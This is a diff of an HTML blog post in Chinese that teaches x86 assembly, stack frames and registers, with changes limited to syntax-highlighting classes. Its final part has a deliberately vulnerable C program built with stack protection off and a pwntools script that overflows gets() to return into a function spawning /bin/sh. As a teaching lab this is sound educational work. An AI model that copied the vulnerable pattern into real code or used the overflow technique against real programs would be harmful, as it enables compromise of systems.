@@ -133,7 +133,7 @@
 <h3 id="为啥要学汇编">为啥要学汇编</h3>
 <p>  汇编是逆向工程的基础,许多人都希望能够破解软件,制作游戏外挂,不花钱冲会员等等,这都属于逆向工程的范畴.逆向工程就是在只有二进制文件的时候,我通过反汇编的手段来从二进制文件获得汇编代码,进而对汇编代码进行反编译得到类C的高级语言,以辅助我们了解程序逻辑,挖掘程序漏洞.</p>
 
-<p>  同时,逆向工程是学习C/C++最好的途径.C系语言本就是为了开发Unix而生,因此他完美的契合Unix生态,因此在Linux下你可以轻易的获得一个程序的指令码(opcode),汇编代码,以及未链接的目标文件.而你学到现在可能都不知道main函数有三个参数,为什么main函数一定要写<code class="highlighter-rouge">return 0;</code>(虽然你不写,但这是十分差劲的习惯).只有通过阅读汇编代码你才能真正理解程序的运行原理,你才能真正的理解编译的的高明之处,你才能真正领略到前人的伟大智慧.我强烈建议同学们安装ubuntu18.04虚拟机进行实验,这样你才能获得最好的体验.</p>
+<p>  同时,逆向工程是学习C/C++最好的途径.C系语言本就是为了开发Unix而生,因此他完美的契合Unix生态,因此在Linux下你可以轻易的获得一个程序的指令码(opcode),汇编代码,以及未链接的目标文件.而你学到现在可能都不知道main函数有三个参数,为什么main函数一定要写<code class="language-plaintext highlighter-rouge">return 0;</code>(虽然你不写,但这是十分差劲的习惯).只有通过阅读汇编代码你才能真正理解程序的运行原理,你才能真正的理解编译的的高明之处,你才能真正领略到前人的伟大智慧.我强烈建议同学们安装ubuntu18.04虚拟机进行实验,这样你才能获得最好的体验.</p>
 
 <p>  我知道现在流行一种歪风邪气,由于互联网市场膨胀,资本大量流入,大量公司需求网站开发与移动端开发.因此一些学生急功近利,认为自己会写几行php,套个框架,api倒背如流,就算编程大牛了.认为自己会写几行python java,调一调库,用一用flask spring搭个网站,整天拿一些现有的库高谈扩论,写一些业务逻辑,搞几个微信小程序就算是高级程序员了.反而嘲笑C/C++老掉牙,内心浮躁而不愿了解底层,这本身就是一种自欺欺人.多数人由于畏难心理而拒绝C++,只推崇语法糖更加简单的python.作为计算机科学研究人员,我们决不能满足于只写一些应用层逻辑,只有真正了解了计算机的细节,我们才能成为大师,否则你与专科培训班的学生有什么区别.</p>
 
@@ -141,7 +141,7 @@
 <p>  你向家里的弟弟妹妹炫耀你的编程技巧时,你可能写过无数次Hello_world来骗他们了,也许你自认为对它十分熟悉,下面我们从头看看到底发生了什么.
   首先你会熟练的写一个hello.c:</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]){</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"Hello World!"</span><span class="p">);</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
@@ -156,7 +156,7 @@
 <p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/com.png" alt="compilation system" /></p>
 
 <ul>
-  <li>预处理阶段: 预处理器(cpp)根据一字符#开头的命令修改原始C程序.比如hello.c的第一行<code class="highlighter-rouge">#include&lt;stdio.h&gt;</code>命令告诉预处理器读取系统头文件stdio.h的内容,并把它直接插入文本程序中.结果就的到了另一个C程序,通常以”.i”作为后缀.</li>
+  <li>预处理阶段: 预处理器(cpp)根据一字符#开头的命令修改原始C程序.比如hello.c的第一行<code class="language-plaintext highlighter-rouge">#include&lt;stdio.h&gt;</code>命令告诉预处理器读取系统头文件stdio.h的内容,并把它直接插入文本程序中.结果就的到了另一个C程序,通常以”.i”作为后缀.</li>
   <li>编译阶段: 编译器(ccl)将文本文件hello.i翻译成文本文件hello.s,他包含一个汇编程序,该程序的main函数定义,如下:</li>
 </ul>
 
@@ -211,9 +211,9 @@ popq	%rbx
 ret
 </code></pre>
 
-<p>  以上代码描述了一系列机器指令,你会注意到里面有各种<code class="highlighter-rouge">%rax</code>之类的东西,这些%开头的东西就是寄存器(Register).他们是cpu中的储存单元,cpu所进行的一切进算都必须由寄存器储存,同时它也是速度最高的存储单元.我们可以把寄存器理解为局部变量,他用来存储某个函数调用所需要的数据.</p>
+<p>  以上代码描述了一系列机器指令,你会注意到里面有各种<code class="language-plaintext highlighter-rouge">%rax</code>之类的东西,这些%开头的东西就是寄存器(Register).他们是cpu中的储存单元,cpu所进行的一切进算都必须由寄存器储存,同时它也是速度最高的存储单元.我们可以把寄存器理解为局部变量,他用来存储某个函数调用所需要的数据.</p>
 
-<p>  以上这种带%的汇编就是AT&amp;T风格,他的阅读顺序是从左往右,就像是说话一样自然.而<code class="highlighter-rouge">pushq movq</code>等等是一些指令,他们实际上就是英文单词push和mov(即move的缩写),至于为什么后面加了一个’q’,是因为q描述了mov后面的数据的大小.q代表”4字”(quad words)即一个64位数,即<code class="highlighter-rouge">%rdx</code>与<code class="highlighter-rouge">%rbx</code>中存储了long类型的数.而<code class="highlighter-rouge">movq	%rdx, %rbx</code>的意思就如同字面意思一样,把<code class="highlighter-rouge">%rdx</code>里的数据移动到<code class="highlighter-rouge">%rbx</code>里.这就好比C语言中的赋值操作:</p>
+<p>  以上这种带%的汇编就是AT&amp;T风格,他的阅读顺序是从左往右,就像是说话一样自然.而<code class="language-plaintext highlighter-rouge">pushq movq</code>等等是一些指令,他们实际上就是英文单词push和mov(即move的缩写),至于为什么后面加了一个’q’,是因为q描述了mov后面的数据的大小.q代表”4字”(quad words)即一个64位数,即<code class="language-plaintext highlighter-rouge">%rdx</code>与<code class="language-plaintext highlighter-rouge">%rbx</code>中存储了long类型的数.而<code class="language-plaintext highlighter-rouge">movq	%rdx, %rbx</code>的意思就如同字面意思一样,把<code class="language-plaintext highlighter-rouge">%rdx</code>里的数据移动到<code class="language-plaintext highlighter-rouge">%rbx</code>里.这就好比C语言中的赋值操作:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="n">rbx</span> <span class="o">=</span> <span class="o">%</span><span class="n">rdx</span>
 </code></pre></div></div>
 
@@ -231,12 +231,12 @@ ret
 	pop		 rbx
 	ret
 </code></pre>
-<p>  你可以使用<code class="highlighter-rouge">gcc -Og -S -masm=intel mstore.c</code>获得该代码,我们可以看到他与AT&amp;T有以下几点不同:</p>
+<p>  你可以使用<code class="language-plaintext highlighter-rouge">gcc -Og -S -masm=intel mstore.c</code>获得该代码,我们可以看到他与AT&amp;T有以下几点不同:</p>
 <ul>
   <li>Intel 代码省略了指令的后缀,我们看到push和mov而不是pushq和movq.</li>
   <li>Intel 代码省略了寄存器前的%,用的是rbx,而不是%rbx</li>
-  <li>Intel 代码用<code class="highlighter-rouge">QWRD	PTR	[rbx]</code>来描述内存中的内容,而不是<code class="highlighter-rouge">(%rbx)</code></li>
-  <li>Intel 代码目标与对象与AT&amp;T的相反,比如<code class="highlighter-rouge">mov rbx, rdx</code>等价于<code class="highlighter-rouge">rbx = rdx</code>,在AT&amp;T中要写成<code class="highlighter-rouge">movq %rdx, %rbx</code></li>
+  <li>Intel 代码用<code class="language-plaintext highlighter-rouge">QWRD	PTR	[rbx]</code>来描述内存中的内容,而不是<code class="language-plaintext highlighter-rouge">(%rbx)</code></li>
+  <li>Intel 代码目标与对象与AT&amp;T的相反,比如<code class="language-plaintext highlighter-rouge">mov rbx, rdx</code>等价于<code class="language-plaintext highlighter-rouge">rbx = rdx</code>,在AT&amp;T中要写成<code class="language-plaintext highlighter-rouge">movq %rdx, %rbx</code></li>
 </ul>
 
 <hr />
@@ -244,20 +244,20 @@ ret
 <p>  下面我面介绍一下上面出现的几条指令:</p>
 
 <ul>
-  <li><code class="highlighter-rouge">mov</code>: 他是一个传递指令,表示把数据从一处传递到另一处,你可以简单把他理解为赋值语句
+  <li><code class="language-plaintext highlighter-rouge">mov</code>: 他是一个传递指令,表示把数据从一处传递到另一处,你可以简单把他理解为赋值语句
     <ul>
       <li>然而mov的操作对象只有如下几种情况:
         <ol>
-          <li><code class="highlighter-rouge">mov	rax, rbx</code>=&gt; <code class="highlighter-rouge">rax = rbx</code> 即从寄存器到寄存器</li>
-          <li><code class="highlighter-rouge">mov [rax], rbx</code> =&gt; <code class="highlighter-rouge">*rax = rbx</code> 即从寄存器到内存</li>
-          <li><code class="highlighter-rouge">mov rax, [rbx]</code> =&gt; <code class="highlighter-rouge">rax = *rbx</code> 即从内存到寄存器</li>
-          <li><code class="highlighter-rouge">mov rax, 3</code>  =&gt; <code class="highlighter-rouge">rax = 3</code>即将立即数赋值给rax</li>
-          <li><code class="highlighter-rouge">mov [rax], 3</code>    =&gt; <code class="highlighter-rouge">*rax = 3</code> 即将立即数存储在内存
+          <li><code class="language-plaintext highlighter-rouge">mov	rax, rbx</code>=&gt; <code class="language-plaintext highlighter-rouge">rax = rbx</code> 即从寄存器到寄存器</li>
+          <li><code class="language-plaintext highlighter-rouge">mov [rax], rbx</code> =&gt; <code class="language-plaintext highlighter-rouge">*rax = rbx</code> 即从寄存器到内存</li>
+          <li><code class="language-plaintext highlighter-rouge">mov rax, [rbx]</code> =&gt; <code class="language-plaintext highlighter-rouge">rax = *rbx</code> 即从内存到寄存器</li>
+          <li><code class="language-plaintext highlighter-rouge">mov rax, 3</code>  =&gt; <code class="language-plaintext highlighter-rouge">rax = 3</code>即将立即数赋值给rax</li>
+          <li><code class="language-plaintext highlighter-rouge">mov [rax], 3</code>    =&gt; <code class="language-plaintext highlighter-rouge">*rax = 3</code> 即将立即数存储在内存
             <blockquote>
-              <p>无论如何都不能<code class="highlighter-rouge">mov [rax], [rbx]</code> 即不可从内存到内存</p>
+              <p>无论如何都不能<code class="language-plaintext highlighter-rouge">mov [rax], [rbx]</code> 即不可从内存到内存</p>
 
               <blockquote>
-                <p>至于<code class="highlighter-rouge">[rax]</code>是什么东西.<code class="highlighter-rouge">[]</code>是寻址运算符号就相当与C语言中的<code class="highlighter-rouge">*</code>,他会把<code class="highlighter-rouge">[rax]</code>中的rax当作指针,去访问rax储存的地址所指向位置的内容.比如,<code class="highlighter-rouge">mov [rax], 3</code>相当于<code class="highlighter-rouge">*rax = 3</code>.<br />
+                <p>至于<code class="language-plaintext highlighter-rouge">[rax]</code>是什么东西.<code class="language-plaintext highlighter-rouge">[]</code>是寻址运算符号就相当与C语言中的<code class="language-plaintext highlighter-rouge">*</code>,他会把<code class="language-plaintext highlighter-rouge">[rax]</code>中的rax当作指针,去访问rax储存的地址所指向位置的内容.比如,<code class="language-plaintext highlighter-rouge">mov [rax], 3</code>相当于<code class="language-plaintext highlighter-rouge">*rax = 3</code>.<br />
  更加复杂的寻址方式暂时跳过</p>
               </blockquote>
             </blockquote>
@@ -266,7 +266,7 @@ ret
       </li>
     </ul>
   </li>
-  <li><code class="highlighter-rouge">push</code>: 相信大家应该都用过C++里面的Vector了,应该都比较熟悉push和pop了.push和pop本就是为了栈(Stack)这种数据结构所设计的,<code class="highlighter-rouge">push</code>和<code class="highlighter-rouge">pop</code>分别描述了入栈和出栈的操作.</li>
+  <li><code class="language-plaintext highlighter-rouge">push</code>: 相信大家应该都用过C++里面的Vector了,应该都比较熟悉push和pop了.push和pop本就是为了栈(Stack)这种数据结构所设计的,<code class="language-plaintext highlighter-rouge">push</code>和<code class="language-plaintext highlighter-rouge">pop</code>分别描述了入栈和出栈的操作.</li>
 </ul>
 
 <p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/Data_stack.png" alt="data_stack" /></p>
@@ -280,7 +280,7 @@ ret
 </code></pre></div></div>
 <p>  我们看到A()函数调用了B();那么我们首先要清楚一件事,当B()运行结束之后会发生什么?</p>
 
-<p>  显然要接着继续执行A()后面的指令,那么我们要怎样才能在B()运行结束后回到A()内并继续执行<code class="highlighter-rouge">b = a + 1</code>呢?很显然,我们必须在执行B()之前就提前保存好当前的所有状态,并且把B()返回后要执行的下一条指令提前储存起来.这样我们才能在每一次函数调用结束后回到原来的位置并继续向下执行.</p>
+<p>  显然要接着继续执行A()后面的指令,那么我们要怎样才能在B()运行结束后回到A()内并继续执行<code class="language-plaintext highlighter-rouge">b = a + 1</code>呢?很显然,我们必须在执行B()之前就提前保存好当前的所有状态,并且把B()返回后要执行的下一条指令提前储存起来.这样我们才能在每一次函数调用结束后回到原来的位置并继续向下执行.</p>
 
 <p>  想到这里,似乎stack就是最好的实现方式.在每一次进行函数调用的时候就把当前的相关寄存器的值push进stack,并且把被调函数结束后的返回地址也push进stack,这样以来,当函数结束时,我们只需要把相关数据再pop到对应的寄存器,我们就相当于恢复了调用前的状态,类似于游戏的”存档与读档”的操作.如果我们要实现递归调用,那么我们只需要在每一次调用时建立起新的stack frame即栈帧,每个函数都有自己的栈帧,每个栈帧存储着对应函数调用的数据.因此我们只需要一直push,为每次递归建立新的栈帧,在返回时将对应栈帧的内容pop出来就能完美的实现递归调用.</p>
 
@@ -301,12 +301,12 @@ ret
 <p>  我们在这里只是简单的介绍一下原理,更多的细节在后面会分析.</p>
 
 <ul>
-  <li><code class="highlighter-rouge">call</code>: 正如其字面意思,就是调用某个函数的意思,其参数是一段地址</li>
-  <li><code class="highlighter-rouge">pop</code>: 其参数应为应为某寄存器,效果是将栈顶数据弹出至目标寄存器.</li>
-  <li><code class="highlighter-rouge">ret</code>: 即函数返回
+  <li><code class="language-plaintext highlighter-rouge">call</code>: 正如其字面意思,就是调用某个函数的意思,其参数是一段地址</li>
+  <li><code class="language-plaintext highlighter-rouge">pop</code>: 其参数应为应为某寄存器,效果是将栈顶数据弹出至目标寄存器.</li>
+  <li><code class="language-plaintext highlighter-rouge">ret</code>: 即函数返回
     <ul>
       <li>这里又要强调一下,有一个错误观点:许多人认为函数没有返回值就不需要返回.这个观点是极端错误的.返回的真正意义是:当前被调用函数(called function)执行结束后,回到上层调用函数(callee function)的过程.而返回值仅仅是函数向外层传递出的结果,函数会把想要传递出的结果在返回之前放入%rax寄存器,这个值就叫返回值.</li>
-      <li>实际上<code class="highlighter-rouge">ret</code>等价于<code class="highlighter-rouge">pop %rip</code>  这里很重要,后文会详细说明.</li>
+      <li>实际上<code class="language-plaintext highlighter-rouge">ret</code>等价于<code class="language-plaintext highlighter-rouge">pop %rip</code>  这里很重要,后文会详细说明.</li>
     </ul>
   </li>
 </ul>
@@ -318,7 +318,7 @@ ret
 
 <p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/register.png" alt="register" /></p>
 
-<p>  我们可以看到图中写了一些你根本看不懂的东西(%rax之类的),那就是寄存器的名字,首先这附图的最右边介绍了各种寄存器的作用,比如%rax的作用是储存”Return value”,即储存返回值.接着我们看图的最上面写着几个神秘数字<code class="highlighter-rouge">0 7 8 15 31 63</code>,这一串神秘数字代表了寄存器的大小,你可以清楚的看到,当寄存器的大小不同时,他们的名字似乎不太一样.比如%rax包括了%eax,而%eax包括了%ax,%ax又包括了%ah和%al.为啥好端端的寄存器要分这么细呀?这是由于历史原因造成的.</p>
+<p>  我们可以看到图中写了一些你根本看不懂的东西(%rax之类的),那就是寄存器的名字,首先这附图的最右边介绍了各种寄存器的作用,比如%rax的作用是储存”Return value”,即储存返回值.接着我们看图的最上面写着几个神秘数字<code class="language-plaintext highlighter-rouge">0 7 8 15 31 63</code>,这一串神秘数字代表了寄存器的大小,你可以清楚的看到,当寄存器的大小不同时,他们的名字似乎不太一样.比如%rax包括了%eax,而%eax包括了%ax,%ax又包括了%ah和%al.为啥好端端的寄存器要分这么细呀?这是由于历史原因造成的.</p>
 
 <p>  传说,在上古时期,人们还处于只有16位cpu的蛮荒时代,上古大神编程也使用8086汇编.那个时候一个寄存器的大小最大也只有16位,就是上图%ax %bx那一列.可见古代程序员编程条件比较艰苦,虽然寄存器只有16位,但是他们又想实现一些黑魔法来优化算法,这就需要更加细致的操作寄存器,因此他们又把寄存器分成了高8位与低8位两部分,即%ah与%al.</p>
 
@@ -335,13 +335,13 @@ ret
     </li>
     <li>大佬: 优化一下
       <ul>
-        <li>800  848  (真实地址 = 基地址*偏移+偏移地址) <code class="highlighter-rouge">800 * 10 + 848</code></li>
+        <li>800  848  (真实地址 = 基地址*偏移+偏移地址) <code class="language-plaintext highlighter-rouge">800 * 10 + 848</code></li>
       </ul>
     </li>
   </ul>
 </blockquote>
 
-<p>  其实道理很简单,正常人简单的把十进制数分成两半实际上也是基址+偏移的一种,但是由于设计错误,导致基址和偏移要同时发生改变.比如,假如今天想换个口味,想吃九本拉面了,距离变成了8747Km,<code class="highlighter-rouge">87 47</code>相对于<code class="highlighter-rouge">88 48</code>变了两个数.而<code class="highlighter-rouge">800 848</code>相对于<code class="highlighter-rouge">800 747</code>来说只变了一个偏移,这样就可以减少一次修改寄存器的操作.</p>
+<p>  其实道理很简单,正常人简单的把十进制数分成两半实际上也是基址+偏移的一种,但是由于设计错误,导致基址和偏移要同时发生改变.比如,假如今天想换个口味,想吃九本拉面了,距离变成了8747Km,<code class="language-plaintext highlighter-rouge">87 47</code>相对于<code class="language-plaintext highlighter-rouge">88 48</code>变了两个数.而<code class="language-plaintext highlighter-rouge">800 848</code>相对于<code class="language-plaintext highlighter-rouge">800 747</code>来说只变了一个偏移,这样就可以减少一次修改寄存器的操作.</p>
 
 <blockquote>
   <p>这种寻址方式称之为”间址寻址”(因为是间接的嘛),由于现在的寄存器都容量很大所以这种寻址方式变得不再常见,但是这种神奇的思想依然十分重要,在函数建立栈帧的时候依然使用间址寻址的方式,请大家反复思索并理解.</p>
@@ -376,7 +376,7 @@ ret
     <p>%rdi %rsi %rdx  %rcx  %r8  %r9: 在x86-64位程序中,分别是调用函数时传递参数时使用的,若有更多参数,则存入栈中.例如:</p>
 
     <ul>
-      <li><code class="highlighter-rouge">printf("%d %d %d %d %d %d %d",1,2,3,4,5,6,7);</code>则1-6分别存在%rdi - %r9中,’7’则存于栈上.</li>
+      <li><code class="language-plaintext highlighter-rouge">printf("%d %d %d %d %d %d %d",1,2,3,4,5,6,7);</code>则1-6分别存在%rdi - %r9中,’7’则存于栈上.</li>
       <li>需要注意的是x86程序,即32位程序的传参方式与64位区别很大,32位程序的参数传递完全依靠栈.</li>
     </ul>
   </li>
@@ -419,35 +419,35 @@ ret
 <p>  介绍一下,剩下几个指令:</p>
 
 <ul>
-  <li><code class="highlighter-rouge">sub</code>: 故名思意,减的意思.<code class="highlighter-rouge">sub eax, 0xc</code> 就是<code class="highlighter-rouge">eax = eax - 0xc</code>的意思
+  <li><code class="language-plaintext highlighter-rouge">sub</code>: 故名思意,减的意思.<code class="language-plaintext highlighter-rouge">sub eax, 0xc</code> 就是<code class="language-plaintext highlighter-rouge">eax = eax - 0xc</code>的意思
     <ul>
-      <li>AT&amp;T写法:<code class="highlighter-rouge">sub  $0xc, %eax</code></li>
+      <li>AT&amp;T写法:<code class="language-plaintext highlighter-rouge">sub  $0xc, %eax</code></li>
       <li>注:’$’开头的东西叫”立即数”,就是常数</li>
     </ul>
   </li>
-  <li><code class="highlighter-rouge">add</code>: 与sub同理,不再赘述</li>
-  <li><code class="highlighter-rouge">lea</code>:这个指令比较神奇,她叫做”加载有效地址(Load Effective Address)”,其实就是C/C++里的取址操作,例如:
+  <li><code class="language-plaintext highlighter-rouge">add</code>: 与sub同理,不再赘述</li>
+  <li><code class="language-plaintext highlighter-rouge">lea</code>:这个指令比较神奇,她叫做”加载有效地址(Load Effective Address)”,其实就是C/C++里的取址操作,例如:
     <ul>
-      <li><code class="highlighter-rouge">lea eax, 13(esp)</code>等价于<code class="highlighter-rouge">eax = *(esp-13)</code></li>
+      <li><code class="language-plaintext highlighter-rouge">lea eax, 13(esp)</code>等价于<code class="language-plaintext highlighter-rouge">eax = *(esp-13)</code></li>
       <li>lea还可以用于简单的算数计算,例如:
         <ul>
-          <li><code class="highlighter-rouge">lea	rax, (rdi,rsi,4)</code>等价于<code class="highlighter-rouge">rax = rdi + rsi * 4</code></li>
+          <li><code class="language-plaintext highlighter-rouge">lea	rax, (rdi,rsi,4)</code>等价于<code class="language-plaintext highlighter-rouge">rax = rdi + rsi * 4</code></li>
         </ul>
       </li>
     </ul>
   </li>
-  <li><code class="highlighter-rouge">nop</code>: 啥也不干…理论上等价于….<code class="highlighter-rouge">mov eax, eax</code> ,主要起到延时的作用.</li>
-  <li><code class="highlighter-rouge">jmp:</code> 故名思意,jump跳转的意思,用法<code class="highlighter-rouge">jmp 0x400ac</code>,意思是跳转到0x400ac这个地放执行指令.
+  <li><code class="language-plaintext highlighter-rouge">nop</code>: 啥也不干…理论上等价于….<code class="language-plaintext highlighter-rouge">mov eax, eax</code> ,主要起到延时的作用.</li>
+  <li><code class="language-plaintext highlighter-rouge">jmp:</code> 故名思意,jump跳转的意思,用法<code class="language-plaintext highlighter-rouge">jmp 0x400ac</code>,意思是跳转到0x400ac这个地放执行指令.
     <ul>
       <li>jmp一般会出现在: if-else语句  goto语句   各种loop</li>
-      <li>同系列还有<code class="highlighter-rouge">je  jne  jle  jge jl jg</code>,他们是”条件跳转”,若等于则跳转,若不等于则跳转,若小于等于则跳转,若大于等于则跳转……..自行脑补
+      <li>同系列还有<code class="language-plaintext highlighter-rouge">je  jne  jle  jge jl jg</code>,他们是”条件跳转”,若等于则跳转,若不等于则跳转,若小于等于则跳转,若大于等于则跳转……..自行脑补
         <blockquote>
           <p>汇编中,循环一般使用jmp进行实现,其实就是jmp到循环开始的地方</p>
         </blockquote>
       </li>
     </ul>
   </li>
-  <li><code class="highlighter-rouge">cmp</code>: compare比较的意思,就是比较一下两个对象是否相等,用法:<code class="highlighter-rouge">cmp eax, 1</code>比较eax是否等于1,一般用于if-else语句,循环判断等等…</li>
+  <li><code class="language-plaintext highlighter-rouge">cmp</code>: compare比较的意思,就是比较一下两个对象是否相等,用法:<code class="language-plaintext highlighter-rouge">cmp eax, 1</code>比较eax是否等于1,一般用于if-else语句,循环判断等等…</li>
 </ul>
 
 <blockquote>
@@ -504,7 +504,7 @@ ret
 <p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/stack_frame2.jpg" alt="stack_frame2" /></p>
 
 <blockquote>
-  <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 在多线程(任务)环境，栈顶指针指向的存储器区域就是当前使用的堆栈。切换线程的一个重要工作，就是将栈顶指针设为当前线程的堆栈栈顶地址。
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 在多线程(任务)环境，栈顶指针指向的存储器区域就是当前使用的堆栈。切换线程的一个重要工作，就是将栈顶指针设为当前线程的堆栈栈顶地址。
 </code></pre></div>  </div>
 </blockquote>
 
@@ -666,7 +666,7 @@ C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的�
 </ul>
 
 <blockquote>
-  <p><code class="highlighter-rouge">__declspec</code>是微软关键字，其他系统上可能没有。</p>
+  <p><code class="language-plaintext highlighter-rouge">__declspec</code>是微软关键字，其他系统上可能没有。</p>
 </blockquote>
 
 <ul>
@@ -789,7 +789,7 @@ pip <span class="nb">install </span>pwntools
   <p>注:</p>
 
   <blockquote>
-    <p>通常的计算机系统中,我们规定用户对文件有三种权限即<em>Read Write Execute</em>(RWX)读 写 可执行.在linux的终端里输入<code class="highlighter-rouge">ls -al</code>命令,结果如下:</p>
+    <p>通常的计算机系统中,我们规定用户对文件有三种权限即<em>Read Write Execute</em>(RWX)读 写 可执行.在linux的终端里输入<code class="language-plaintext highlighter-rouge">ls -al</code>命令,结果如下:</p>
     <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aurora:~/File/doc <span class="c"># ls -al</span>
 总用量 2028
 drwxr-xr-x 3 root root    4096 8月  22 21:58 <span class="nb">.</span>
@@ -798,7 +798,7 @@ drwxr-xr-x 7 root root    4096 8月  23 23:35 ..
 <span class="nt">-rw-r--r--</span> 1 root root 2007460 8月  22 21:55 assembly.pdf
 drwxr-xr-x 2 root root    4096 8月  13 00:17 pictures
 </code></pre></div>    </div>
-    <p>你可以看到前面有一堆rwx或者’-‘之类的,这就代表用户对该文件的权限,<code class="highlighter-rouge">ls</code>这条命令是我们比较常用的命令,他是list的缩写,作用是列举当前目录下的文件(目录类似于文件夹). 后面的 <code class="highlighter-rouge">-al</code>是两个参数,a代表<em>all</em>,l代表<em>line</em>,就是把所有的文件(包含隐藏文件)按行展示出来.就是上面的结果,顺便一提,名字以<code class="highlighter-rouge">.</code>开头的文件都是隐藏文件比如<code class="highlighter-rouge">.hello.cpp</code>,ls命令不加参数a无法看到隐藏文件.</p>
+    <p>你可以看到前面有一堆rwx或者’-‘之类的,这就代表用户对该文件的权限,<code class="language-plaintext highlighter-rouge">ls</code>这条命令是我们比较常用的命令,他是list的缩写,作用是列举当前目录下的文件(目录类似于文件夹). 后面的 <code class="language-plaintext highlighter-rouge">-al</code>是两个参数,a代表<em>all</em>,l代表<em>line</em>,就是把所有的文件(包含隐藏文件)按行展示出来.就是上面的结果,顺便一提,名字以<code class="language-plaintext highlighter-rouge">.</code>开头的文件都是隐藏文件比如<code class="language-plaintext highlighter-rouge">.hello.cpp</code>,ls命令不加参数a无法看到隐藏文件.</p>
   </blockquote>
 </blockquote>
 
@@ -806,8 +806,8 @@ drwxr-xr-x 2 root root    4096 8月  13 00:17 pictures
 
 <p>下面来个简单的例子:</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
-#include&lt;stdlib.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span>
 <span class="kt">void</span> <span class="nf">pwn</span><span class="p">(){</span>
     <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
@@ -861,9 +861,9 @@ buffer.c:(.text+0x97): 警告：the `gets'</span> <span class="k">function </spa
 <p>  解释一下这几个参数的作用:</p>
 
 <ul>
-  <li><code class="highlighter-rouge">-m32</code>:指的是生成32位程序</li>
-  <li><code class="highlighter-rouge">-fno-stack-protector</code>:字面意思,关闭栈保护,不生成canary</li>
-  <li><code class="highlighter-rouge">-no-pie</code>:关闭pie(Position Independent Executable),这个pie并不能吃,他使程序的地址被打乱,导致我们无法返回到固定目标地址.</li>
+  <li><code class="language-plaintext highlighter-rouge">-m32</code>:指的是生成32位程序</li>
+  <li><code class="language-plaintext highlighter-rouge">-fno-stack-protector</code>:字面意思,关闭栈保护,不生成canary</li>
+  <li><code class="language-plaintext highlighter-rouge">-no-pie</code>:关闭pie(Position Independent Executable),这个pie并不能吃,他使程序的地址被打乱,导致我们无法返回到固定目标地址.</li>
 </ul>
 
 <p>  你可以使用如下命令来运行它:</p>
@@ -990,7 +990,7 @@ call		8049030&lt;gets@plt&gt;;调用gets()
  80491ac:       c3                      ret   
 </code></pre>
 
-<p>加入我们输入的字符串为:<code class="highlighter-rouge">0x28 * 'a' + 'bbbb' + pwn_addr</code>,那么由于gets只有读到回车才停,所以这一段字符串会把saved_ebp覆盖为bbbb,将ret_addr覆盖为pwn_addr,那么,此时栈的结构为:</p>
+<p>加入我们输入的字符串为:<code class="language-plaintext highlighter-rouge">0x28 * 'a' + 'bbbb' + pwn_addr</code>,那么由于gets只有读到回车才停,所以这一段字符串会把saved_ebp覆盖为bbbb,将ret_addr覆盖为pwn_addr,那么,此时栈的结构为:</p>
 
 <pre><code class="language-plain">                                           +-----------------+
                                            |    0x08049182   |
@@ -1031,15 +1031,15 @@ call		8049030&lt;gets@plt&gt;;调用gets()
 </span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>  <span class="c1">#引入pwntools的库
 </span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span> <span class="c1"># 开启debug模式,可以记录发送和收到的字符串
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span> <span class="c1"># 开启debug模式,可以记录发送和收到的字符串
 </span>
 <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./a'</span><span class="p">)</span>  <span class="c1">#构造与程序交互的对象
 </span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="s">'bbbb'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049182</span><span class="p">)</span>  <span class="c1"># 构造payload
 </span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># 将字符串发送给程序
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># 将字符串发送给程序
 </span>
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># 将代码变为手动交互
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># 将代码变为手动交互
 </span>
 </code></pre></div></div>
 
@@ -1091,16 +1091,16 @@ $
 </span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>  <span class="c1">#引入pwntools的库
 </span>
